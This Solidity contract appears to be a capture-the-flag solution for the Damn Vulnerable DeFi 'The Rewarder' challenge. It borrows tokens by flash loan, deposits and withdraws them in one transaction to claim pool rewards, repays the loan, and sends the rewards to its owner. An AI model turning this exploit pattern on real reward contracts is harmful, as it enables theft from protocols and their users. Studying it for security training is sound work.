import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackTheRewarder {
    FlashLoanerPool flashLoan;
    TheRewarderPool pool;
    IERC20 public immutable damnValuableToken;
    IERC20 public immutable rewardToken;
    address owner;

    constructor(
        FlashLoanerPool _flashLoan,
        TheRewarderPool _pool,
        address _tokenAddress,
        address _rewardToken
    ) {
        flashLoan = _flashLoan;
        pool = _pool;
        damnValuableToken = IERC20(_tokenAddress);
        rewardToken = IERC20(_rewardToken);
        owner = msg.sender;
    }

    function attack(uint256 _amount) external {
        damnValuableToken.approve(address(flashLoan), _amount);
        damnValuableToken.approve(address(pool), _amount);
        flashLoan.flashLoan(_amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 _amount) external {
        pool.deposit(_amount);
        pool.withdraw(_amount);
        damnValuableToken.transfer(address(flashLoan), _amount);
    }
}
